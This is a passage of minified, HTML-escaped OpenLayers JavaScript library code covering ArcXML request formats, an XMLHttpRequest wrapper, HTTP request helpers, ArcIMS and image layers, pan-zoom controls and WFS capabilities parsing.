type."&#125;return b&#125;,parseAttributes:function(a,b)&#123;for(var c=&#123;&#125;,d=0;d&lt;a.attributes.length;d++)c[a.attributes[d].nodeName]="number"==b?parseFloat(a.attributes[d].nodeValue):a.attributes[d].nodeValue;return c&#125;,parsePointGeometry:function(a)&#123;var b=[],c=a.getElementsByTagName("COORDS");if(0&lt;c.length)for(a=this.getChildValue(c[0]),a=a.split(/;/),c=0;c&lt;a.length;c++)&#123;var d=a[c].split(/ /);b.push(new OpenLayers.Geometry.Point(d[0],d[1]))&#125;else if(a=a.getElementsByTagName("POINT"),0&lt;a.length)for(c=0;c&lt;a.length;c++)b.push(new OpenLayers.Geometry.Point(parseFloat(a[c].getAttribute("x")),parseFloat(a[c].getAttribute("y"))));return new OpenLayers.Geometry.LinearRing(b)&#125;,CLASS_NAME:"OpenLayers.Format.ArcXML"&#125;);OpenLayers.Format.ArcXML.Request=OpenLayers.Class(&#123;initialize:function(a)&#123;return OpenLayers.Util.extend(this,&#123;get_image:&#123;properties:&#123;background:null,draw:!0,envelope:&#123;minx:0,miny:0,maxx:0,maxy:0&#125;,featurecoordsys:&#123;id:0,string:"",datumtransformid:0,datumtransformstring:""&#125;,filtercoordsys:&#123;id:0,string:"",datumtransformid:0,datumtransformstring:""&#125;,imagesize:&#123;height:0,width:0,dpi:96,printheight:0,printwidth:0,scalesymbols:!1&#125;,layerlist:[],output:&#123;baseurl:"",legendbaseurl:"",legendname:"",legendpath:"",legendurl:"",name:"",path:"",type:"jpg",url:""&#125;&#125;&#125;,get_feature:&#123;layer:"",query:&#123;isspatial:!1,featurecoordsys:&#123;id:0,string:"",datumtransformid:0,datumtransformstring:""&#125;,filtercoordsys:&#123;id:0,string:"",datumtransformid:0,datumtransformstring:""&#125;,buffer:0,where:"",spatialfilter:&#123;relation:"envelope_intersection",envelope:null&#125;&#125;&#125;,environment:&#123;separators:&#123;cs:" ",ts:";"&#125;&#125;,layer:[],workspaces:[]&#125;)&#125;,CLASS_NAME:"OpenLayers.Format.ArcXML.Request"&#125;);OpenLayers.Format.ArcXML.Response=OpenLayers.Class(&#123;initialize:function(a)&#123;return OpenLayers.Util.extend(this,&#123;image:&#123;envelope:null,output:""&#125;,features:&#123;featurecount:0,envelope:null,feature:[]&#125;,error:""&#125;)&#125;,CLASS_NAME:"OpenLayers.Format.ArcXML.Response"&#125;);(function()&#123;function a()&#123;this._object=f&amp;&amp;!k?new f:new window.ActiveXObject("Microsoft.XMLHTTP");this._listeners=[]&#125;function b()&#123;return new a&#125;function c(a)&#123;b.onreadystatechange&amp;&amp;b.onreadystatechange.apply(a);a.dispatchEvent(&#123;type:"readystatechange",bubbles:!1,cancelable:!1,timeStamp:new Date+0&#125;)&#125;function d(a)&#123;try&#123;a.responseText=a._object.responseText&#125;catch(b)&#123;&#125;try&#123;var c;var d=a._object,e=d.responseXML,f=d.responseText;h&amp;&amp;(f&amp;&amp;e&amp;&amp;!e.documentElement&amp;&amp;d.getResponseHeader("Content-Type").match(/[^\/]+\/[^\+]+\+xml/))&amp;&amp;(e=new window.ActiveXObject("Microsoft.XMLDOM"),e.async=!1,e.validateOnParse=!1,e.loadXML(f));c=e&amp;&amp;(h&amp;&amp;0!=e.parseError||!e.documentElement||e.documentElement&amp;&amp;"parsererror"==e.documentElement.tagName)?null:e;a.responseXML=c&#125;catch(g)&#123;&#125;try&#123;a.status=a._object.status&#125;catch(k)&#123;&#125;try&#123;a.statusText=a._object.statusText&#125;catch(u)&#123;&#125;&#125;function e(a)&#123;a._object.onreadystatechange=new window.Function&#125;var f=window.XMLHttpRequest,g=!!window.controllers,h=window.document.all&amp;&amp;!window.opera,k=h&amp;&amp;window.navigator.userAgent.match(/MSIE 7.0/);b.prototype=a.prototype;g&amp;&amp;f.wrapped&amp;&amp;(b.wrapped=f.wrapped);b.UNSENT=0;b.OPENED=1;b.HEADERS_RECEIVED=2;b.LOADING=3;b.DONE=4;b.prototype.readyState=b.UNSENT;b.prototype.responseText="";b.prototype.responseXML=null;b.prototype.status=0;b.prototype.statusText="";b.prototype.priority="NORMAL";b.prototype.onreadystatechange=null;b.onreadystatechange=null;b.onopen=null;b.onsend=null;b.onabort=null;b.prototype.open=function(a,f,k,p,q)&#123;delete this._headers;3&gt;arguments.length&amp;&amp;(k=!0);this._async=k;var r=this,s=this.readyState,t;h&amp;&amp;k&amp;&amp;(t=function()&#123;s!=b.DONE&amp;&amp;(e(r),r.abort())&#125;,window.attachEvent("onunload",t));b.onopen&amp;&amp;b.onopen.apply(this,arguments);4&lt;arguments.length?this._object.open(a,f,k,p,q):3&lt;arguments.length?this._object.open(a,f,k,p):this._object.open(a,f,k);this.readyState=b.OPENED;c(this);this._object.onreadystatechange=function()&#123;if(!g||k)r.readyState=r._object.readyState,d(r),r._aborted?r.readyState=b.UNSENT:(r.readyState==b.DONE&amp;&amp;(delete r._data,e(r),h&amp;&amp;k&amp;&amp;window.detachEvent("onunload",t)),s!=r.readyState&amp;&amp;c(r),s=r.readyState)&#125;&#125;;b.prototype.send=function(a)&#123;b.onsend&amp;&amp;b.onsend.apply(this,arguments);arguments.length||(a=null);a&amp;&amp;a.nodeType&amp;&amp;(a=window.XMLSerializer?(new window.XMLSerializer).serializeToString(a):a.xml,this._headers["Content-Type"]||this._object.setRequestHeader("Content-Type","application/xml"));this._data=a;a:if(this._object.send(this._data),g&amp;&amp;!this._async)for(this.readyState=b.OPENED,d(this);this.readyState&lt;b.DONE;)if(this.readyState++,c(this),this._aborted)break a&#125;;b.prototype.abort=function()&#123;b.onabort&amp;&amp;b.onabort.apply(this,arguments);this.readyState&gt;b.UNSENT&amp;&amp;(this._aborted=!0);this._object.abort();e(this);this.readyState=b.UNSENT;delete this._data&#125;;b.prototype.getAllResponseHeaders=function()&#123;return this._object.getAllResponseHeaders()&#125;;b.prototype.getResponseHeader=function(a)&#123;return this._object.getResponseHeader(a)&#125;;b.prototype.setRequestHeader=function(a,b)&#123;this._headers||(this._headers=&#123;&#125;);this._headers[a]=b;return this._object.setRequestHeader(a,b)&#125;;b.prototype.addEventListener=function(a,b,c)&#123;for(var d=0,e;e=this._listeners[d];d++)if(e[0]==a&amp;&amp;e[1]==b&amp;&amp;e[2]==c)return;this._listeners.push([a,b,c])&#125;;b.prototype.removeEventListener=function(a,b,c)&#123;for(var d=0,e;(e=this._listeners[d])&amp;&amp;(e[0]!=a||e[1]!=b||e[2]!=c);d++);e&amp;&amp;this._listeners.splice(d,1)&#125;;b.prototype.dispatchEvent=function(a)&#123;a=&#123;type:a.type,target:this,currentTarget:this,eventPhase:2,bubbles:a.bubbles,cancelable:a.cancelable,timeStamp:a.timeStamp,stopPropagation:function()&#123;&#125;,preventDefault:function()&#123;&#125;,initEvent:function()&#123;&#125;&#125;;"readystatechange"==a.type&amp;&amp;this.onreadystatechange&amp;&amp;(this.onreadystatechange.handleEvent||this.onreadystatechange).apply(this,[a]);for(var b=0,c;c=this._listeners[b];b++)c[0]!=a.type||c[2]||(c[1].handleEvent||c[1]).apply(this,[a])&#125;;b.prototype.toString=function()&#123;return"[object XMLHttpRequest]"&#125;;b.toString=function()&#123;return"[XMLHttpRequest]"&#125;;window.Function.prototype.apply||(window.Function.prototype.apply=function(a,b)&#123;b||(b=[]);a.__func=this;a.__func(b[0],b[1],b[2],b[3],b[4]);delete a.__func&#125;);OpenLayers.Request||(OpenLayers.Request=&#123;&#125;);OpenLayers.Request.XMLHttpRequest=b&#125;)();OpenLayers.ProxyHost="";OpenLayers.Request||(OpenLayers.Request=&#123;&#125;);OpenLayers.Util.extend(OpenLayers.Request,&#123;DEFAULT_CONFIG:&#123;method:"GET",url:window.location.href,async:!0,user:void 0,password:void 0,params:null,proxy:OpenLayers.ProxyHost,headers:&#123;&#125;,data:null,callback:function()&#123;&#125;,success:null,failure:null,scope:null&#125;,URL_SPLIT_REGEX:/([^:]*:)\/\/([^:]*:?[^@]*@)?([^:\/\?]*):?([^\/\?]*)/,events:new OpenLayers.Events(this),makeSameOrigin:function(a,b)&#123;var c=0!==a.indexOf("http"),d=!c&amp;&amp;a.match(this.URL_SPLIT_REGEX);if(d)&#123;var e=window.location,c=d[1]==e.protocol&amp;&amp;d[3]==e.hostname,d=d[4],e=e.port;if(80!=d&amp;&amp;""!=d||"80"!=e&amp;&amp;""!=e)c=c&amp;&amp;d==e&#125;c||b&amp;&amp;(a="function"==typeof b?b(a):b+encodeURIComponent(a));return a&#125;,issue:function(a)&#123;var b=OpenLayers.Util.extend(this.DEFAULT_CONFIG,&#123;proxy:OpenLayers.ProxyHost&#125;);a=a||&#123;&#125;;a.headers=a.headers||&#123;&#125;;a=OpenLayers.Util.applyDefaults(a,b);a.headers=OpenLayers.Util.applyDefaults(a.headers,b.headers);var b=!1,c;for(c in a.headers)a.headers.hasOwnProperty(c)&amp;&amp;"x-requested-with"===c.toLowerCase()&amp;&amp;(b=!0);!1===b&amp;&amp;(a.headers["X-Requested-With"]="XMLHttpRequest");var d=new OpenLayers.Request.XMLHttpRequest,e=OpenLayers.Util.urlAppend(a.url,OpenLayers.Util.getParameterString(a.params||&#123;&#125;)),e=OpenLayers.Request.makeSameOrigin(e,a.proxy);d.open(a.method,e,a.async,a.user,a.password);for(var f in a.headers)d.setRequestHeader(f,a.headers[f]);var g=this.events,h=this;d.onreadystatechange=function()&#123;d.readyState==OpenLayers.Request.XMLHttpRequest.DONE&amp;&amp;!1!==g.triggerEvent("complete",&#123;request:d,config:a,requestUrl:e&#125;)&amp;&amp;h.runCallbacks(&#123;request:d,config:a,requestUrl:e&#125;)&#125;;!1===a.async?d.send(a.data):window.setTimeout(function()&#123;0!==d.readyState&amp;&amp;d.send(a.data)&#125;,0);return d&#125;,runCallbacks:function(a)&#123;var b=a.request,c=a.config,d=c.scope?OpenLayers.Function.bind(c.callback,c.scope):c.callback,e;c.success&amp;&amp;(e=c.scope?OpenLayers.Function.bind(c.success,c.scope):c.success);var f;c.failure&amp;&amp;(f=c.scope?OpenLayers.Function.bind(c.failure,c.scope):c.failure);"file:"==OpenLayers.Util.createUrlObject(c.url).protocol&amp;&amp;b.responseText&amp;&amp;(b.status=200);d(b);if(!b.status||200&lt;=b.status&amp;&amp;300&gt;b.status)this.events.triggerEvent("success",a),e&amp;&amp;e(b);b.status&amp;&amp;(200&gt;b.status||300&lt;=b.status)&amp;&amp;(this.events.triggerEvent("failure",a),f&amp;&amp;f(b))&#125;,GET:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"GET"&#125;);return OpenLayers.Request.issue(a)&#125;,POST:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"POST"&#125;);a.headers=a.headers?a.headers:&#123;&#125;;"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)&#125;,PUT:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"PUT"&#125;);a.headers=a.headers?a.headers:&#123;&#125;;"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)&#125;,DELETE:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"DELETE"&#125;);return OpenLayers.Request.issue(a)&#125;,HEAD:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"HEAD"&#125;);return OpenLayers.Request.issue(a)&#125;,OPTIONS:function(a)&#123;a=OpenLayers.Util.extend(a,&#123;method:"OPTIONS"&#125;);return OpenLayers.Request.issue(a)&#125;&#125;);OpenLayers.Layer.ArcIMS=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;DEFAULT_PARAMS:&#123;ClientVersion:"9.2",ServiceName:""&#125;,featureCoordSys:"4326",filterCoordSys:"4326",layers:null,async:!0,name:"ArcIMS",isBaseLayer:!0,DEFAULT_OPTIONS:&#123;tileSize:new OpenLayers.Size(512,512),featureCoordSys:"4326",filterCoordSys:"4326",layers:null,isBaseLayer:!0,async:!0,name:"ArcIMS"&#125;,initialize:function(a,b,c)&#123;this.tileSize=new OpenLayers.Size(512,512);this.params=OpenLayers.Util.applyDefaults(&#123;ServiceName:c.serviceName&#125;,this.DEFAULT_PARAMS);this.options=OpenLayers.Util.applyDefaults(c,this.DEFAULT_OPTIONS);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,this.params,c]);this.transparent&amp;&amp;(this.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.format&amp;&amp;(this.format=OpenLayers.Util.alphaHack()?"image/gif":"image/png"));null===this.options.layers&amp;&amp;(this.options.layers=[])&#125;,getURL:function(a)&#123;var b="";a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,&#123;requesttype:"image",envelope:a.toArray(),tileSize:this.tileSize&#125;));a=new OpenLayers.Request.POST(&#123;url:this.getFullRequestString(),data:a.write(),async:!1&#125;);null!=a&amp;&amp;(b=a.responseXML,b&amp;&amp;b.documentElement||(b=a.responseText),b=(new OpenLayers.Format.ArcXML).read(b),b=this.getUrlOrImage(b.image.output));return b&#125;,getURLasync:function(a,b,c)&#123;a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,&#123;requesttype:"image",envelope:a.toArray(),tileSize:this.tileSize&#125;));OpenLayers.Request.POST(&#123;url:this.getFullRequestString(),async:!0,data:a.write(),callback:function(a)&#123;var e=a.responseXML;e&amp;&amp;e.documentElement||(e=a.responseText);a=(new OpenLayers.Format.ArcXML).read(e);b.call(c,this.getUrlOrImage(a.image.output))&#125;,scope:this&#125;)&#125;,getUrlOrImage:function(a)&#123;var b="";a.url?b=a.url:a.data&amp;&amp;(b="data:image/"+a.type+";base64,"+a.data);return b&#125;,setLayerQuery:function(a,b)&#123;for(var c=0;c&lt;this.options.layers.length;c++)if(a==this.options.layers[c].id)&#123;this.options.layers[c].query=b;return&#125;this.options.layers.push(&#123;id:a,visible:!0,query:b&#125;)&#125;,getFeatureInfo:function(a,b,c)&#123;var d=c.buffer||1,e=c.callback||function()&#123;&#125;,f=c.scope||window,g=&#123;&#125;;OpenLayers.Util.extend(g,this.options);g.requesttype="feature";a instanceof OpenLayers.LonLat?(g.polygon=null,g.envelope=[a.lon-d,a.lat-d,a.lon+d,a.lat+d]):a instanceof OpenLayers.Geometry.Polygon&amp;&amp;(g.envelope=null,g.polygon=a);var h=new OpenLayers.Format.ArcXML(g);OpenLayers.Util.extend(h.request.get_feature,c);h.request.get_feature.layer=b.id;"number"==typeof b.query.accuracy?h.request.get_feature.query.accuracy=b.query.accuracy:(a=this.map.getCenter(),c=this.map.getViewPortPxFromLonLat(a),c.x++,c=this.map.getLonLatFromPixel(c),h.request.get_feature.query.accuracy=c.lon-a.lon);h.request.get_feature.query.where=b.query.where;h.request.get_feature.query.spatialfilter.relation="area_intersection";OpenLayers.Request.POST(&#123;url:this.getFullRequestString(&#123;CustomService:"Query"&#125;),data:h.write(),callback:function(a)&#123;a=h.parseResponse(a.responseText);h.iserror()?e.call(f,null):e.call(f,a.features)&#125;&#125;)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.ArcIMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,CLASS_NAME:"OpenLayers.Layer.ArcIMS"&#125;);OpenLayers.Control.PanZoom=OpenLayers.Class(OpenLayers.Control,&#123;slideFactor:50,slideRatio:null,buttons:null,position:null,initialize:function(a)&#123;this.position=new OpenLayers.Pixel(OpenLayers.Control.PanZoom.X,OpenLayers.Control.PanZoom.Y);OpenLayers.Control.prototype.initialize.apply(this,arguments)&#125;,destroy:function()&#123;this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);this.removeButtons();this.position=this.buttons=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.register("buttonclick",this,this.onButtonClick)&#125;,draw:function(a)&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position;this.buttons=[];var b=&#123;w:18,h:18&#125;,c=new OpenLayers.Pixel(a.x+b.w/2,a.y);this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h;this._addButton("panleft","west-mini.png",a,b);this._addButton("panright","east-mini.png",a.add(b.w,0),b);this._addButton("pandown","south-mini.png",c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);this._addButton("zoomworld","zoom-world-mini.png",c.add(0,4*b.h+5),b);this._addButton("zoomout","zoom-minus-mini.png",c.add(0,5*b.h+5),b);return this.div&#125;,_addButton:function(a,b,c,d)&#123;b=OpenLayers.Util.getImageLocation(b);c=OpenLayers.Util.createAlphaImageDiv(this.id+"_"+a,c,d,b,"absolute");c.style.cursor="pointer";this.div.appendChild(c);c.action=a;c.className="olButton";this.buttons.push(c);return c&#125;,_removeButton:function(a)&#123;this.div.removeChild(a);OpenLayers.Util.removeItem(this.buttons,a)&#125;,removeButtons:function()&#123;for(var a=this.buttons.length-1;0&lt;=a;--a)this._removeButton(this.buttons[a])&#125;,onButtonClick:function(a)&#123;switch(a.buttonElement.action)&#123;case "panup":this.map.pan(0,-this.getSlideFactor("h"));break;case "pandown":this.map.pan(0,this.getSlideFactor("h"));break;case "panleft":this.map.pan(-this.getSlideFactor("w"),0);break;case "panright":this.map.pan(this.getSlideFactor("w"),0);break;case "zoomin":this.map.zoomIn();break;case "zoomout":this.map.zoomOut();break;case "zoomworld":this.map.zoomToMaxExtent()&#125;&#125;,getSlideFactor:function(a)&#123;return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor&#125;,CLASS_NAME:"OpenLayers.Control.PanZoom"&#125;);OpenLayers.Control.PanZoom.X=4;OpenLayers.Control.PanZoom.Y=4;OpenLayers.Control.PanZoomBar=OpenLayers.Class(OpenLayers.Control.PanZoom,&#123;zoomStopWidth:18,zoomStopHeight:11,slider:null,sliderEvents:null,zoombarDiv:null,zoomWorldIcon:!1,panIcons:!0,forceFixedZoomLevel:!1,mouseDragStart:null,deltaY:null,zoomStart:null,destroy:function()&#123;this._removeZoomBar();this.map.events.un(&#123;changebaselayer:this.redraw,updatesize:this.redraw,scope:this&#125;);OpenLayers.Control.PanZoom.prototype.destroy.apply(this,arguments);delete this.mouseDragStart;delete this.zoomStart&#125;,setMap:function(a)&#123;OpenLayers.Control.PanZoom.prototype.setMap.apply(this,arguments);this.map.events.on(&#123;changebaselayer:this.redraw,updatesize:this.redraw,scope:this&#125;)&#125;,redraw:function()&#123;null!=this.div&amp;&amp;(this.removeButtons(),this._removeZoomBar());this.draw()&#125;,draw:function(a)&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position.clone();this.buttons=[];var b=&#123;w:18,h:18&#125;;if(this.panIcons)&#123;var c=new OpenLayers.Pixel(a.x+b.w/2,a.y),d=b.w;this.zoomWorldIcon&amp;&amp;(c=new OpenLayers.Pixel(a.x+b.w,a.y));this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h;this._addButton("panleft","west-mini.png",a,b);this.zoomWorldIcon&amp;&amp;(this._addButton("zoomworld","zoom-world-mini.png",a.add(b.w,0),b),d*=2);this._addButton("panright","east-mini.png",a.add(d,0),b);this._addButton("pandown","south-mini.png",c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);c=this._addZoomBar(c.add(0,4*b.h+5));this._addButton("zoomout","zoom-minus-mini.png",c,b)&#125;else this._addButton("zoomin","zoom-plus-mini.png",a,b),c=this._addZoomBar(a.add(0,b.h)),this._addButton("zoomout","zoom-minus-mini.png",c,b),this.zoomWorldIcon&amp;&amp;(c=c.add(0,b.h+3),this._addButton("zoomworld","zoom-world-mini.png",c,b));return this.div&#125;,_addZoomBar:function(a)&#123;var b=OpenLayers.Util.getImageLocation("slider.png"),c=this.id+"_"+this.map.id,d=this.map.getMinZoom(),e=this.map.getNumZoomLevels()-1-this.map.getZoom(),e=OpenLayers.Util.createAlphaImageDiv(c,a.add(-1,e*this.zoomStopHeight),&#123;w:20,h:9&#125;,b,"absolute");e.style.cursor="move";this.slider=e;this.sliderEvents=new OpenLayers.Events(this,e,null,!0,&#123;includeXY:!0&#125;);this.sliderEvents.on(&#123;touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp&#125;);var f=&#123;w:this.zoomStopWidth,h:this.zoomStopHeight*(this.map.getNumZoomLevels()-d)&#125;,b=OpenLayers.Util.getImageLocation("zoombar.png"),c=null;OpenLayers.Util.alphaHack()?(c=this.id+"_"+this.map.id,c=OpenLayers.Util.createAlphaImageDiv(c,a,&#123;w:f.w,h:this.zoomStopHeight&#125;,b,"absolute",null,"crop"),c.style.height=f.h+"px"):c=OpenLayers.Util.createDiv("OpenLayers_Control_PanZoomBar_Zoombar"+this.map.id,a,f,b);c.style.cursor="pointer";c.className="olButton";this.zoombarDiv=c;this.div.appendChild(c);this.startTop=parseInt(c.style.top);this.div.appendChild(e);this.map.events.register("zoomend",this,this.moveZoomBar);return a=a.add(0,this.zoomStopHeight*(this.map.getNumZoomLevels()-d))&#125;,_removeZoomBar:function()&#123;this.sliderEvents.un(&#123;touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp&#125;);this.sliderEvents.destroy();this.div.removeChild(this.zoombarDiv);this.zoombarDiv=null;this.div.removeChild(this.slider);this.slider=null;this.map.events.unregister("zoomend",this,this.moveZoomBar)&#125;,onButtonClick:function(a)&#123;OpenLayers.Control.PanZoom.prototype.onButtonClick.apply(this,arguments);if(a.buttonElement===this.zoombarDiv)&#123;var b=a.buttonXY.y/this.zoomStopHeight;if(this.forceFixedZoomLevel||!this.map.fractionalZoom)b=Math.floor(b);b=this.map.getNumZoomLevels()-1-b;b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1);this.map.zoomTo(b)&#125;&#125;,passEventToSlider:function(a)&#123;this.sliderEvents.handleBrowserEvent(a)&#125;,zoomBarDown:function(a)&#123;if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.map.events.on(&#123;touchmove:this.passEventToSlider,mousemove:this.passEventToSlider,mouseup:this.passEventToSlider,scope:this&#125;),this.mouseDragStart=a.xy.clone(),this.zoomStart=a.xy.clone(),this.div.style.cursor="move",this.zoombarDiv.offsets=null,OpenLayers.Event.stop(a)&#125;,zoomBarDrag:function(a)&#123;if(null!=this.mouseDragStart)&#123;var b=this.mouseDragStart.y-a.xy.y,c=OpenLayers.Util.pagePosition(this.zoombarDiv);0&lt;a.clientY-c[1]&amp;&amp;a.clientY-c[1]&lt;parseInt(this.zoombarDiv.style.height)-2&amp;&amp;(b=parseInt(this.slider.style.top)-b,this.slider.style.top=b+"px",this.mouseDragStart=a.xy.clone());this.deltaY=this.zoomStart.y-a.xy.y;OpenLayers.Event.stop(a)&#125;&#125;,zoomBarUp:function(a)&#123;if((OpenLayers.Event.isLeftClick(a)||"touchend"===a.type)&amp;&amp;this.mouseDragStart)&#123;this.div.style.cursor="";this.map.events.un(&#123;touchmove:this.passEventToSlider,mouseup:this.passEventToSlider,mousemove:this.passEventToSlider,scope:this&#125;);var b=this.map.zoom;!this.forceFixedZoomLevel&amp;&amp;this.map.fractionalZoom?(b+=this.deltaY/this.zoomStopHeight,b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1)):(b+=this.deltaY/this.zoomStopHeight,b=Math.max(Math.round(b),0));this.map.zoomTo(b);this.zoomStart=this.mouseDragStart=null;this.deltaY=0;OpenLayers.Event.stop(a)&#125;&#125;,moveZoomBar:function()&#123;var a=(this.map.getNumZoomLevels()-1-this.map.getZoom())*this.zoomStopHeight+this.startTop+1;this.slider.style.top=a+"px"&#125;,CLASS_NAME:"OpenLayers.Control.PanZoomBar"&#125;);OpenLayers.Format.WFSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WFSCapabilities"&#125;);OpenLayers.Format.WFSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;wfs:"http://www.opengis.net/wfs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"&#125;,errorProperty:"featureTypeList",defaultPrefix:"wfs",read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;wfs:&#123;WFS_Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,FeatureTypeList:function(a,b)&#123;b.featureTypeList=&#123;featureTypes:[]&#125;;this.readChildNodes(a,b.featureTypeList)&#125;,FeatureType:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.featureTypes.push(c)&#125;,Name:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(c=c.split(":"),b.name=c.pop(),0&lt;c.length&amp;&amp;(b.featureNS=this.lookupNamespaceURI(a,c[0])))&#125;,Title:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b.title=c)&#125;,Abstract:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b["abstract"]=c)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1"&#125;);OpenLayers.Format.WFSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,&#123;regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,readers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;DefaultSRS:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)&#125;&#125;,OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs),ows:OpenLayers.Format.OWSCommon.v1.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_1_0"&#125;);OpenLayers.Layer.Image=OpenLayers.Class(OpenLayers.Layer,&#123;isBaseLayer:!0,url:null,extent:null,size:null,tile:null,aspectRatio:null,initialize:function(a,b,c,d,e)&#123;this.url=b;this.maxExtent=this.extent=c;this.size=d;OpenLayers.Layer.prototype.initialize.apply(this,[a,e]);this.aspectRatio=this.extent.getHeight()/this.size.h/(this.extent.getWidth()/this.size.w)&#125;,destroy:function()&#123;this.tile&amp;&amp;(this.removeTileMonitoringHooks(this.tile),this.tile.destroy(),this.tile=null);OpenLayers.Layer.prototype.destroy.apply(this,arguments)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.Image(this.name,this.url,this.extent,this.size,this.getOptions()));return a=OpenLayers.Layer.prototype.clone.apply(this,[a])&#125;,setMap:function(a)&#123;null==this.options.maxResolution&amp;&amp;(this.options.maxResolution=this.aspectRatio*this.extent.getWidth()/this.size.w);OpenLayers.Layer.prototype.setMap.apply(this,arguments)&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=null==this.tile;if(b||d)&#123;this.setTileSize();var e=this.map.getLayerPxFromLonLat(&#123;lon:this.extent.left,lat:this.extent.top&#125;);d?(this.tile=new OpenLayers.Tile.Image(this,e,this.extent,null,this.tileSize),this.addTileMonitoringHooks(this.tile)):(this.tile.size=this.tileSize.clone(),this.tile.position=e.clone());this.tile.draw()&#125;&#125;,setTileSize:function()&#123;var a=this.extent.getWidth()/this.map.getResolution(),b=this.extent.getHeight()/this.map.getResolution();this.tileSize=new OpenLayers.Size(a,b)&#125;,addTileMonitoringHooks:function(a)&#123;a.onLoadStart=function()&#123;this.events.triggerEvent("loadstart")&#125;;a.events.register("loadstart",this,a.onLoadStart);a.onLoadEnd=function()&#123;this.events.triggerEvent("loadend")&#125;;a.events.register("loadend",this,a.onLoadEnd);a.events.register("unload",this,a.onLoadEnd)&#125;,removeTileMonitoringHooks:function(a)&#123;a.unload();a.events.un(&#123;loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,scope:this&#125;)&#125;,setUrl:function(a)&#123;this.url=a;this.tile.draw()&#125;,getURL:function(a)&#123;return this.url&#125;,CLASS_NAME:"OpenLayers.Layer.Image"&#125;);OpenLayers.Strategy=OpenLayers.Class(&#123;layer:null,options:null,active:null,autoActivate:!0,autoDestroy:!0,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.options=a;this.active=!1&#125;,destroy:function()&#123;this.deactivate();this.options=this.layer=null&#125;,setLayer:function(a)&#123;this.layer=a&#125;,activate:function()&#123;return this.active?!1:this.active=!0&#125;,deactivate:function()&#123;return this.active?(this.active=!1,!0):!1&#125;,CLASS_NAME:"OpenLayers.Strategy"&#125;);OpenLayers.Strategy.Save=OpenLayers.Class(OpenLayers.Strategy,&#123;events:null,auto:!1,timer:null,initialize:function(a)&#123;OpenLayers.Strategy.prototype.initialize.apply(this,[a]);this.events=new OpenLayers.Events(this)&#125;,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.call(this);if(a&amp;&amp;this.auto)if("number"===typeof this.auto)this.timer=window.setInterval(OpenLayers.Function.bind(this.save,this),1E3*this.auto);else 